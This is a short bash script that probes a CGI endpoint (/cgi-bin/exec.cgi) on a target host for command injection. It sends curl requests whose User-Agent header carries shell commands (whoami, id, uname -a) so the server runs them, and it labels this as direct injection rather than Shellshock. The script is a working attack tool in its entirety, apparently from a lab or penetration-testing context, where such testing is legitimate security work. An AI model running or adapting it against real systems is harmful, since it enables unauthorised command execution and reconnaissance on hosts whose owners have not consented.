#!/bin/bash
echo "[+] Testing direct command injection against CGI endpoint (NOT Shellshock function-import)"

if [ ! -z "$1" ]; then
    TARGET="$1"
    echo "[+] Target: $TARGET"
    
    echo "[+] Testing with whoami command:"
    curl -H "User-Agent: /bin/whoami" http://$TARGET/cgi-bin/exec.cgi
    
    echo ""
    echo "[+] Testing with id command:"
    curl -H "User-Agent: /bin/id" http://$TARGET/cgi-bin/exec.cgi
    
    echo ""
    echo "[+] Testing system information:"
    curl -H "User-Agent: /bin/uname -a" http://$TARGET/cgi-bin/exec.cgi
    
else
    echo "[+] Usage: $0 <target_ip>"
    echo "[+] Example: $0 192.168.1.100"
fi